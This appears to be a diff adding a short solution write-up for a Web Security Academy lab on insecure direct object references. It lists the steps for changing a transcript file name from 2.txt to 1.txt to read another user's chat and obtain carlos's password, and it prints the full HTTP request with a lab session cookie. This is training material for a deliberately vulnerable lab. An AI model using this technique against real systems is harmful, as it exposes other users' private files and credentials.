@@ -1,0 +1,17 @@
+Insecure direct object references
+
+The solution provided is great. View the chat log, download transcript, send it to repeater, change the file from 2.txt to 1.txt. The response will have some funny dialogue and carlos's password.
+Log in as carlos to claim your victory.
+
+Request:
+GET /download-transcript/1.txt HTTP/1.1
+Host: acba1fa21f9f040b80a20da0002a00b3.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acba1fa21f9f040b80a20da0002a00b3.web-security-academy.net/chat
+Cookie: session=E7taWpvHjxlH8fOjKwUEAHu1OOzRD5xi
+Upgrade-Insecure-Requests: 1
+
